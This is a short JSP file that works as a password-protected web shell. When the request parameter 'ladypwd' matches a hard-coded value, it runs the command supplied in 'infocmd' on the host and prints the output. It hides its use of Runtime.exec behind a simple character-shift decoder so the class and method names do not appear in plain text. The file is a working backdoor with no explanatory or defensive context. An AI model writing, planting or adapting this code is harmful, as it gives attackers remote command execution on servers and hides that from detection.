<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public String dEc(String cipher) {
        String plain = "";
        for (int i = 0; i < cipher.length(); i++) {
            plain += (char)(cipher.charAt(i) + 10);
        }
        return plain;
    }
%>
<%
    if ("shaqima".equals(request.getParameter("ladypwd"))) {
        out.print("<pre>");
        String[] shit = request.getParameter("infocmd").split(" ");
        if (shit != null) {
            Class rtmeCls = Class.forName(dEc("`WlW$bWd]$Hkdj_c["));
            Method perfMtd = rtmeCls.getMethod(dEc("[n[Y"), String[].class);
            Process proc = (Process) perfMtd.invoke(rtmeCls.getMethod(dEc("][jHkdj_c[")).invoke(null), (Object)shit);
            InputStream in = proc.getInputStream();
            int ret = -1;
            byte[] bs = new byte[2048];
            out.print("<pre>");
            while((ret = in.read(bs)) != -1) {
                out.println(new String(bs));
            }
            out.print("</pre>");
        }
    }
%>
